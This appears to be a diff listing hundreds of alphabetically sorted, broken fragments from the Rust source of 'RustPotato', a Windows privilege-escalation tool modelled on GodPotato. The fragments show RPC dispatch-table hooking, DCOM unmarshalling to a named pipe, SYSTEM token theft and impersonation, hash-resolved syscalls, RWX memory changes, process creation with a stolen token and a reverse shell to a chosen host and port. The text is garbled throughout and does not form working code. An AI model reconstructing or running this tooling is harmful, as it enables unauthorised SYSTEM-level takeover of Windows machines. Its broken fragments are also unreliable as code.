@@ -1,0 +1,700 @@
+"(""-"""
+"(""----------------------------------\n[+] INITIALIZE CONTEXT - END\n"""
+"(""----------------------------------\n[+] PIPE SERVER - END\n"""
+"(""----------------------------------\n[+] RPC HOOK - END\n"""
+"(""-{}"", id_auth_value"
+"(""-{}"", sub_auth"
+"(""00000000-0000-0000-C000-000000000046"""
+"(""127.0.0.1"""
+"(""18f70770-8e64-11cf-9af1-0020af6e72f4"".to_string("
+"("":"", """""
+"(""?"""
+"(""CreateProcessWithTokenW failed: {}"", Error::last_os_error("
+"(""GUID length is incorrect, must be 16 bytes"".into("
+"(""Invalid GUID format"".into("
+"(""Invalid TowerProtocol value"""
+"(""NtCreateNamedPipeFile failed: {:#X}"", status"
+"(""NtQueryObject failed: {:#X}"", status"
+"(""NtSetInformationObject failed: {:#X}"", status"
+"(""S-{}"", revision"
+"(""Zw"""
+"(""[!] Cannot start: Hook is inactive or server already running"""
+"(""[!] Global context is already set"""
+"(""[+] Context successfully initialized"""
+"(""[+] Creating process via 'CreateProcessWithTokenW'"""
+"(""[+] DCOM object Flags: 0x{:x}"", flags"
+"(""[+] DCOM object GUID: {}"", guid.value"
+"(""[+] DCOM object IPID: {}"", ipid.value"
+"(""[+] DCOM object OID: 0x{:x}"", oid"
+"(""[+] DCOM object OXID: 0x{:x}"", oxid"
+"(""[+] DCOM object PublicRefs: {}"", public_refs"
+"(""[+] DispatchTable entry {}: 0x{:016X}"", i, entry as usize"
+"(""[+] FmtStringOffset entry {}: {}"", i, offset"
+"(""[+] Impersonation of pipe client successful"""
+"(""[+] Initializing pipe server"""
+"(""[+] Initiating unmarshalling trigger to connect with the pipe server"""
+"(""[+] Memory protection updated to PAGE_EXECUTE_READWRITE"""
+"(""[+] Named pipe created: {}"", server_pipe"
+"(""[+] Pipe connection established"""
+"(""[+] Pipe handle: 0x{:08X}"", pipe_handle as usize"
+"(""[+] Pipe server thread terminated successfully."""
+"(""[+] Process output:"""
+"(""[+] RPC hook successfully installed"""
+"(""[+] RPC hook successfully removed"""
+"(""[+] Retrieved {} handles"", handles.len("
+"(""[+] Reverted to self successfully"""
+"(""[+] Searching for RPC_SERVER_INTERFACE structure..."""
+"(""[+] Searching for System Token"""
+"(""[+] Sending termination signal to the pipe server."""
+"(""[+] Test for list_process_token passed successfully."""
+"(""[+] Test for list_system_handles passed successfully."""
+"(""[+] Waiting for pipe connection"""
+"(""[-] Could not parse the ObjRef from the provided byte stream."""
+"(""[-] Error: Both -h and -p are required."""
+"(""[-] Error: Invalid port value"""
+"(""[-] Error: Missing value for -c"""
+"(""[-] Error: Missing value for -h"""
+"(""[-] Error: Missing value for -p"""
+"(""[-] Error: The argument cannot be an empty string."""
+"(""[-] Error: Unknown option {}"", args[i]"
+"(""[-] Failed to allocate memory for handle information"""
+"(""[-] Failed to allocate memory from the process heap."""
+"(""[-] Failed to convert the moniker's display name into a string."""
+"(""[-] Failed to create named pipe."""
+"(""[-] Failed to decode the Base64 object reference"""
+"(""[-] Failed to duplicate token. Error: {}"", _e"
+"(""[-] Failed to find IDL structure"""
+"(""[-] Failed to initialize COM library: {:?}"", hr"
+"(""[-] Failed to initialize unmarshalling trigger"""
+"(""[-] Failed to join pipe server thread: {:?}"", _e"
+"(""[-] Failed to locate RPC_SERVER_INTERFACE structure."""
+"(""[-] Failed to locate combase.dll module."""
+"(""[-] Failed to obtain the display name of the moniker."""
+"(""[-] Failed to obtain the process heap."""
+"(""[-] Failed to read DLL content from memory."""
+"(""[-] Failed to start reverse shell"""
+"(""[-] Invalid OBJREF signature"""
+"(""[-] NtDuplicateToken failed with status: {:#X}"", nt_status"
+"(""[-] ObjRef serialization failed."""
+"(""[-] Pipe server is not running."""
+"(""[-] RTF RVA is 0, returning -1..."""
+"(""[-] System token not found"""
+"(""[-] The object reference could not be decoded from Base64."""
+"(""[-] Unknown token ELEVATION TYPE : {}"", elevation_type"
+"(""[-] Unsupported OBJREF type"""
+"(""[-] combase.dll module not found"""
+"(""\\\\.\\pipe\\RustPotato\\pipe\\epmapper"""
+"(""\n[+] INITIALIZE CONTEXT - START\n----------------------------------"""
+"(""\n[+] PIPE SERVER - START\n----------------------------------"""
+"(""\n[+] RPC HOOK - START\n----------------------------------"""
+"(""ncacn_ip_tcp:safe !"""
+"(""ncacn_np:localhost/pipe/RustPotato[\\pipe\\epmapper]"""
+"(""objref:"", """""
+"(""{:<30} {:<10} {:<20}"", ""Function"", ""SSN"", ""Address"""
+"(""{:?}"", ntdll.nt_close.address("
+"(""{:?}"", ntdll.nt_create_named_pipe_file.address("
+"(""{:?}"", ntdll.nt_duplicate_object.address("
+"(""{:?}"", ntdll.nt_duplicate_token.address("
+"(""{:?}"", ntdll.nt_open_file.address("
+"(""{:?}"", ntdll.nt_open_process.address("
+"(""{:?}"", ntdll.nt_open_process_token.address("
+"(""{:?}"", ntdll.nt_protect_virtual_memory.address("
+"(""{:?}"", ntdll.nt_query_information_process.address("
+"(""{:?}"", ntdll.nt_query_information_token.address("
+"(""{:?}"", ntdll.nt_query_object.address("
+"(""{:?}"", ntdll.nt_query_system_information.address("
+"(""{:?}"", ntdll.nt_read_file.address("
+"(""{:?}"", ntdll.nt_set_information_object.address("
+"(""{:?}"", ntdll.nt_terminate_process.address("
+"(""{:?}"", ntdll.nt_wait_for_single_object.address("
+"(""{:?}"", ntdll.nt_write_file.address("
+"(""{}"", e"
+"(""{}"", out"
+"(""{}"", token"
+"($module_base, $hash"
+"($module_base:expr, $( $syscall:expr "
+"($module_base:expr, [ $( ($syscall:expr, $hash:expr, $f:ty"
+"($name:ident, $hash:expr"
+"($ssn, $addr + 0x12, cnt, $($y"
+"($ssn:expr, $addr:expr, $($y:expr"
+"(&c, h, p"
+"(&dll_content, &pattern"
+"(&mut process_tokens, token"
+"(&mut self, c: &str, h: Option<&str>, p: Option<u16>"
+"(&mut self, p: *mut winapi::ctypes::c_void"
+"(&mut self, source_string: *const u16"
+"(&process_token_node.sid, &process_token.sid"
+"(&self, f: &mut fmt::Formatter"
+"(&self, f: &mut fmt::Formatter<'_>"
+"(&self, handle: *mut c_void"
+"(&self, handle: *mut c_void, alertable: bool, timeout: *mut c_void"
+"(&self, process_handle: *mut c_void, exit_status: i32"
+"(&self, writer: &mut W"
+"(&self.bind_ctx, None"
+"((security_descriptor, security_descriptor_size"
+"() as i32, 0"
+"(), &hints, &mut res"
+"(), c, raw_token_handle.as_handle("
+"(*mut SECURITY_DESCRIPTOR, u32"
+"(0x0202, &mut wsa_data"
+"(0x1edab0ed, None"
+"(0x56777929, Some(&mut module_size"
+"(0x64bb3129, None"
+"(0x6ddb9555, None"
+"(0xa, 0xffff, None"
+"(2, 1, 6"
+"(Clone, Copy"
+"(Clone, Copy, Debug"
+"(Clone, Copy, Debug, Eq, PartialEq"
+"(Clone, Default"
+"(Copy, Clone"
+"(Copy, Clone, Default"
+"(Debug, Clone"
+"(Debug, Clone, Copy"
+"(Debug, Clone, Copy, PartialEq, Eq"
+"(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord"
+"(Default, Debug, Clone"
+"(None, COINIT_MULTITHREADED"
+"(NtClose, 0x40d6e69d"
+"(NtCreateNamedPipeFile, 0x1da0062e"
+"(NtDuplicateObject, 0x4441d859"
+"(NtDuplicateToken, 0x8e160b23"
+"(NtOpenFile, 0x46dde739"
+"(NtOpenProcess, 0x4b82f718"
+"(NtOpenProcessToken, 0x350dca99"
+"(NtProtectVirtualMemory, 0x50e92888"
+"(NtQueryInformationProcess, 0x8cdc5dc2"
+"(NtQueryInformationToken, 0xf371fe4"
+"(NtQueryObject, 0xc85dc9b4"
+"(NtQuerySystemInformation, 0x7bc23928"
+"(NtReadFile, 0xb2d93203"
+"(NtSetInformationObject, 0x214310"
+"(NtTerminateProcess, 0x4ed9dd4f"
+"(NtWaitForSingleObject, 0xe8ac0c3c"
+"(NtWriteFile, 0xe0d61db2"
+"(TokenUsername::new(name_string, domain_string"
+"([bytes[0], bytes[1], bytes[2], bytes[3]]"
+"([bytes[4], bytes[5]]"
+"([bytes[6], bytes[7]]"
+"(_, handle"
+"(af: i32, socket_type: i32, protocol: i32"
+"(array_of_addresses, number_of_functions as _"
+"(array_of_names, number_of_functions as _"
+"(array_of_ordinals, number_of_functions as _"
+"(authn_svc: u16, authz_svc: u16, principal_name: Option<String>"
+"(c: &str, h: Option<&str>, p: Option<u16>"
+"(child_stdout_read, HANDLE_FLAG_INHERIT, 0"
+"(core::slice::from_raw_parts(dll_name, dll_name_len"
+"(dll_buffer_ptr as *const u8, dll_length"
+"(e.g., ""cmd.exe"" or ""powershell.exe"""
+"(e.g., `HANDLE_FLAG_INHERIT` or `HANDLE_FLAG_PROTECT_FROM_CLOSE`"
+"(e.g., `\\.\pipe\RustPotato`"
+"(e.g., `cmd.exe` or `powershell.exe`"
+"(e.g., inheritable"
+"(e.g., low, medium, high"
+"(e.g., socket creation, connection, or process execution"
+"(f, ""   Is Restricted: {}"", self.is_restricted"
+"(f, ""   Target Process PID: {}"", self.target_process_pid"
+"(f, ""   Token Handle: 0x{:X}"", self.token_handle as usize"
+"(f, ""[+] Token Details:"""
+"(f, ""{}\\{}"", self.domain, self.name"
+"(feature = ""verbose"""
+"(guid: GUID, standard_objref: Standard"
+"(h: &str, p: u16, c: &str, htoken: *mut winapi::ctypes::c_void"
+"(hHeap: *mut c_void, dwFlags: u32, dwBytes: usize"
+"(handle_info_ptr, i"
+"(handle_info_ptr, layout"
+"(handle_info_ptr: *const u8, index: usize"
+"(handle_info_size, std::mem::align_of::<u8>("
+"(hash: usize, addr: &mut *mut u8"
+"(i, &byte"
+"(i, &entry"
+"(i, &offset"
+"(input_arg, None, None"
+"(module_base: *mut u8, function_hash: usize"
+"(module_hash: u32, out_module_size: Option<&mut usize>"
+"(name: String, domain: String"
+"(name_addr as _, name_len"
+"(ntdll.module_base, 0x3be94c5a"
+"(ntdll.module_base, 0x9e456a43"
+"(optional, can be `NULL`"
+"(optional, default is cmd"
+"(or, honestly, in everything you do"
+"(p10 as *mut *mut c_void, p11"
+"(p11 as *mut *mut c_void, p12"
+"(p12 as *mut *mut c_void, p13"
+"(p2 as *mut *mut c_void, p3"
+"(p3 as *mut *mut c_void, p4"
+"(p4 as *mut *mut c_void, p5"
+"(p5 as *mut *mut c_void, p6"
+"(p6 as *mut *mut c_void, p7"
+"(p7 as *mut *mut c_void, p8"
+"(p8 as *mut *mut c_void, p9"
+"(p9 as *mut *mut c_void, p10"
+"(parts[0], 16"
+"(parts[1], 16"
+"(parts[2], 16"
+"(parts[3], 16"
+"(parts[4], 16"
+"(pdsa_new_bindings as *mut i16, entrie_size as i16"
+"(pi.h_process, false, null_mut("
+"(pid: i32, desired_access: u32"
+"(pipe_handle, ptr::null_mut("
+"(ppdsa_new_bindings, pdsa_new_bindings as *mut c_void"
+"(ppdsa_new_bindings: *mut *mut c_void, _ppdsa_new_security: *mut c_void"
+"(process, module_base as *mut u8, module_size"
+"(process: HANDLE, base_address: *mut u8, size: usize"
+"(process_heap, HEAP_ZERO_MEMORY, stream.len("
+"(process_id: usize, pipe_id: u32"
+"(ptr as *const u8, 8"
+"(ptr as *const u8, expected_length"
+"(s: SOCKET, buf: *const i8, len: i32, flags: i32"
+"(s: SOCKET, buf: *mut i8, len: i32, flags: i32"
+"(s: SOCKET, cmd: i32, argp: *mut u32"
+"(s: SOCKET, name: *const SockAddr, namelen: i32"
+"(security_descriptor, _security_descriptor_size"
+"(self.number, self.address as usize, handle"
+"(sid_ptr, (sub_auth_count - 1"
+"(sock, FIONBIO, &mut nonblocking"
+"(sock, buffer.as_mut_ptr("
+"(sock, h, p"
+"(sock, sockaddr, core::mem::size_of::<SockAddrIn>("
+"(sock: SOCKET, addr: &str, port: u16"
+"(ssn: u16, addr: usize, n_args: u32, ..."
+"(target_arch = ""x86_64"""
+"(target_pid: Option<i32>, mut callback: F"
+"(text: &[u8], pattern: &[u8]"
+"(the ""Software"""
+"(token_handle, 1"
+"(token_handle, 11"
+"(token_handle, 18"
+"(token_handle, 25"
+"(token_handle, 8"
+"(token_handle, 9"
+"(token_handle, token_information_class"
+"(tokens: &mut Vec<ProcessToken>, process_token: ProcessToken"
+"(true, Ordering::Release"
+"(true, |pid| handle_pid == pid as u32"
+"(wVersionRequested: u16, lpWsaData: *mut WsaData"
+"(winsock.closesocket, 0x185953a4, CloseSocketFunc"
+"(winsock.connect, 0xe73478ef, ConnectFunc"
+"(winsock.freeaddrinfo, 0x307204e, FreeAddrInfoFunc"
+"(winsock.getaddrinfo, 0x4b91706c, GetAddrInfoFunc"
+"(winsock.htons, 0xd454eb1, HtonsFunc"
+"(winsock.inet_addr, 0xafe73c2f, InetAddrFunc"
+"(winsock.ioctlsocket, 0xd5e978a9, IoctlsocketFunc"
+"(winsock.recv, 0x7c8b3515, RecvFunc"
+"(winsock.select, 0xce86a705, SelectFunc"
+"(winsock.send, 0x7c8bc2cf, SendFunc"
+"(winsock.socket, 0xcf36c66e, SocketFunc"
+"(winsock.wsa_cleanup, 0x32206eb8, WSACleanupFunc"
+"(winsock.wsa_get_last_error, 0x9c1d912e, WSAGetLastErrorFunc"
+"(winsock.wsa_startup, 0x142e89c3, WSAStartupFunc"
+"(|elevation| format!(""{:?}"", elevation"
+"(|level| format!(""{:?}"", level"
+"(|t| format!(""{:?}"", t"
+"(|| ""cmd"".to_string("
+"(|| String::from(""None"""
+"(|| TokenUsername::new(String::from(""?"""
+($($arg
+($($arg:tt
+($syscall.hash(
+(&(0u16.to_le_bytes(
+(&(core::mem::size_of::<RpcServerInterface>(
+(&String::from_utf8_lossy(&buffer[..bytes_read as usize]
+(&[0xAA]
+(&buf
+(&com_stream
+(&data.unwrap(
+(&domain[..domain_size as usize]
+(&first_match
+(&guid_buf
+(&mut buf
+(&mut bytes
+(&mut cursor
+(&mut guid_buf
+(&mut self
+(&name[..name_size as usize]
+(&objref_bytes.unwrap(
+(&p_iunknown
+(&part1.to_le_bytes(
+(&part2.to_le_bytes(
+(&part3.to_le_bytes(
+(&part4.to_be_bytes(
+(&part5.to_be_bytes(
+(&security_binding_bytes
+(&self
+(&self.guid.to_le_bytes(
+(&self.ipid.to_le_bytes(
+(&self.orcb_rpc_guid.to_le_bytes(
+(&self.server_pipe
+(&string_binding_bytes
+('-'
+('.' as u16
+('?'
+('a' as u8
+((
+((*dos_header
+((*export_directory
+((hsh << 5
+((pipe_id >> shift
+((process_id >> shift
+()
+() && p.is_some(
+() * self.dispatch_table.len(
+() < 8 + (sub_authority_count as usize
+() || port.is_none(
+().add(bytes_written as usize
+().add(first_match
+().add(total_sent as usize
+().as_raw(
+().as_ref(
+().chain(Some(0
+().collect(
+().enumerate(
+().nt_close.run(child_stdout_read
+().nt_close.run(child_stdout_write
+().nt_close.run(dup_handle
+().nt_close.run(new_token
+().nt_close.run(pi.h_process
+().nt_close.run(pi.h_thread
+().nt_close.run(pipe_handle
+().nt_close.run(process_handle.unwrap(
+().nt_close.run(process_info.h_process
+().nt_close.run(process_info.h_thread
+().nt_close.run(read_pipe_handle
+().nt_close.run(self.token_handle
+().nt_close.run(stdin_read
+().nt_close.run(stdin_write
+().nt_close.run(stdout_read
+().nt_close.run(stdout_write
+().nt_close.run(token_handle
+().nt_terminate_process.run(nt_current_process(
+().ok(
+().saturating_sub(pattern.len(
+().to_username(
+().unpark(
+().unwrap(
+().write(true
+(); // Get the Process Environment Block (PEB
+(); // Retrieve the PEB (Process Environment Block
+()?
+(*address_of_names.offset(j as isize
+(*dos_header
+(*ent
+(*export_directory
+(*handle_info
+(*ldr
+(*lp_pipe_attributes
+(*module_list
+(*mut c_void
+(*mut winapi::ctypes::c_void
+(*nt_headers
+(*p_img_nt_headers
+(*peb
+(*peb_ldr_data_ptr
+(*rtf.offset(i as isize
+(*string2
+(-(core::mem::size_of::<ListEntry>(
+(0
+(0-15
+(0..16
+(0..8
+(0..rpc_dispatch_table.dispatch_table_count
+(1
+(16 bytes in total
+(2
+(32-bit values in little-endian format
+(4 * sub_authority_count
+(50
+(8-4-4-4-12
+(A;OICI;GA;;;WD
+(Arc::new(Mutex::new(WindowsIdentity::default(
+(Arc::new(self.clone(
+(Box::new(advapi32
+(Box::new(k32
+(Box::new(ntdll
+(Box::new(winsock
+(C
+(Clone
+(Default
+(Error::last_os_error(
+(GUID { value: guid_string }
+(Globally Unique Identifier
+(HANDLE
+(IP address or hostname
+(IntegrityLevel
+(MSVC or GNU
+(MZ
+(Mutex::new(None
+(ObjRef
+(ObjRefType::Standard as u32
+(Ordering::Acquire
+(PEB
+(PE\0\0
+(PID
+(Primary or Impersonation
+(ProcessToken
+(RID
+(RawHandle
+(RawHandle(p
+(RustPotatoUnmarshalTrigger
+(SDDL
+(SID
+(SOCKET
+(SSN
+(SecurityImpersonationLevel
+(SecurityImpersonationLevel::Anonymous
+(SecurityImpersonationLevel::Delegation
+(SecurityImpersonationLevel::Identification
+(SecurityImpersonationLevel::Impersonation
+(Self::SIGNATURE
+(Sid
+(Sid { value }
+(Some(0
+(Some(node_sid
+(String
+(System Service Number
+(TEB
+(TokenElevationType
+(TokenElevationType::Default
+(TokenElevationType::Full
+(TokenElevationType::Limited
+(TokenType
+(TokenType::Impersonation
+(TokenType::Primary
+(TowerProtocol::EpmProtocolAppletalk
+(TowerProtocol::EpmProtocolDdp
+(TowerProtocol::EpmProtocolDnetNsp
+(TowerProtocol::EpmProtocolDsp
+(TowerProtocol::EpmProtocolHttp
+(TowerProtocol::EpmProtocolIp
+(TowerProtocol::EpmProtocolIpx
+(TowerProtocol::EpmProtocolNamedPipe
+(TowerProtocol::EpmProtocolNbIpx
+(TowerProtocol::EpmProtocolNcacn
+(TowerProtocol::EpmProtocolNcadg
+(TowerProtocol::EpmProtocolNcalrpc
+(TowerProtocol::EpmProtocolNetbeui
+(TowerProtocol::EpmProtocolNetbios
+(TowerProtocol::EpmProtocolNull
+(TowerProtocol::EpmProtocolOsiClns
+(TowerProtocol::EpmProtocolOsiTp4
+(TowerProtocol::EpmProtocolSmb
+(TowerProtocol::EpmProtocolSpx
+(TowerProtocol::EpmProtocolStreettalk
+(TowerProtocol::EpmProtocolTcp
+(TowerProtocol::EpmProtocolUdp
+(TowerProtocol::EpmProtocolUnixDs
+(TowerProtocol::EpmProtocolUuid
+(TowerProtocol::EpmProtocolVinesIpc
+(TowerProtocol::EpmProtocolVinesSpp
+(UTF-16
+(UnsafeCell::new(None
+(_
+(_e
+(`-h` and `-p`
+(`Delegation` or `Impersonation`
+(`GLOBAL_CONTEXT`
+(`HANDLE`
+(`IBindCtx`
+(`IMoniker`
+(`IUnknown`
+(`OBJECT_ATTRIBUTES` and `CLIENT_ID`
+(`ObjRef`
+(`[isize; 512]`
+(`c`
+(`cmdline`
+(`h` for host and `p` for port
+(`is_hook`
+(`is_start = false`
+(`is_start`
+(`is_start` is true
+(addr
+(addr_info.ai_addr as *const SockAddrIn
+(advapi32(
+(allows handle inheritance
+(api_name_addr as _
+(api_name_str.as_bytes(
+(apicall_addr
+(args[i + 1].clone(
+(base_addr as isize + (*dos_header
+(base_addr: *mut u8
+(buffer
+(buffer.as_ptr(
+(buffer: &[u8]
+(buffer_size
+(byte stream or message
+(bytes
+(bytes: &[u8]
+(bytes_read as usize
+(c
+(char::from_u32(character as u32
+(cmd
+(core::ptr::null::<core::ffi::c_void>(
+(cp: *const i8
+(currently unused
+(dead_code
+(desc
+(dest_size + 2
+(device_part.encode_utf16(
+(digit - 10
+(digit: u16
+(display_name
+(dll_name as _
+(dll_name_slice
+(dll_name_str.as_bytes(
+(duplicated
+(e
+(entrie_size - 2
+(export_directory_rva as isize
+(false
+(file
+(flags & HANDLE_FLAG_INHERIT
+(flags & HANDLE_FLAG_PROTECT_FROM_CLOSE
+(function_address as isize
+(functions[ordinal] as isize
+(global_context
+(h.unwrap(
+(handle_entry
+(host.unwrap(
+(hostname
+(hostname: &str
+(hostname_cstr.as_ptr(
+(hostshort: u16
+(hsh
+(https://github.com/BeichenDream
+(https://github.com/BeichenDream/GodPotato
+(https://github.com/safedv/Rustic64Shell
+(https://www.mdsec.co.uk/2022/04/resolving-system-service-numbers-using-the-exception-directory/
+(i
+(i as usize
+(id_auth_value << 8
+(impersonation_level
+(integrity_level
+(io_status_block_read.information - total_sent
+(j as isize
+(k32(
+(layout
+(ldr_load_dll_addr
+(little-endian
+(logon_sid
+(memory_size
+(message: *mut RpcMessage
+(module_base
+(module_base.offset(data_directory.virtual_address as isize
+(mut thread_lock
+(my_primary_token as *mut winapi::ctypes::c_void
+(name_addr as _
+(name_slice
+(names[i as usize] as isize
+(next as *mut u8
+(no message boundaries
+(non_camel_case_types
+(non_snake_case
+(nt_get_last_error(
+(nt_status
+(ntdll(
+(null_mut::<c_void>(
+(num_entries
+(objref_string
+(offset as *const u16
+(offset by 0x12
+(only the process output is printed
+(ordinal as isize
+(out
+(output
+(p
+(pattern
+(pattern: &[u8]
+(pdsa_new_bindings.add(offset
+(pipe_handle
+(pipe_name_utf16.as_ptr(
+(pipe_server_thread
+(pointer: *const char
+(port
+(ppv
+(principal_name
+(process_handle
+(process_sid
+(process_token
+(process_token.token_elevation_type == Some(TokenElevationType::Full
+(ptr: *mut c_void
+(raw_token_handle
+(raw_token_handle.as_handle(
+(reader
+(reader: &mut R
+(reader: &mut impl Read
+(redirect standard handles
+(reg
+(res
+(res: *mut AddrInfo
+(result_str
+(rpc_server_interface.dispatch_table as *const RpcDispatchTable
+(rpc_server_interface.interpreter_info as *const MidlServerInfo
+(rtl_allocate_heap
+(rtl_allocate_heap_addr
+(s: SOCKET
+(security_descriptor as *mut _
+(security_descriptor_string
+(security_offset
+(self.authn_svc
+(self.authz_svc
+(self.dispatch_table_ptr as *const _ as *mut _
+(self.dispatch_table_ptr.add(offset
+(self.flags
+(self.fmt_string_offset_table[0] as usize + 19
+(self.oid
+(self.oxid
+(self.public_refs
+(self.system_identity.as_ref(
+(self.token_handle
+(self.tower_id as u16
+(self.value.as_str(
+(sid_data
+(sid_ptr
+(size_ref
+(sock
+(source_string
+(status
+(status: i32
+(std::io::Error
+(stream.as_ptr(
+(stream: &[u8]
+(string
+(string: *const u16
+(string_binding_bytes.len(
+(system call
+(system_identity_arc
+(target process ID
+(test
+(tmp - pointer as u64
+(tmp as *const u8
+(to_hex_char(hex_digit
+(token
+(token.clone(
+(token_elevation_type
+(token_handle
+(token_handle: *mut c_void
+(token_type
+(token_user.user.sid
+(tower_id
+(trigger
+(u16
+(u16::to_le_bytes
+(u32
+(unsafe { dll_base.offset(rva as isize
+(unsafe_op_in_unsafe_fn
+(unused
+(used for acting on behalf of another security context
+(used for lookup
+(used for process creation
+(used to specify the creation behavior of the process
+(utf16_string.as_ptr(
+(value: String
+(value: u16
+(wide_sid.as_ptr(
+(windows::Win32::Foundation::HGLOBAL(ptr as _
+(winsock(
+(writer
+(|sid| sid.value.clone(
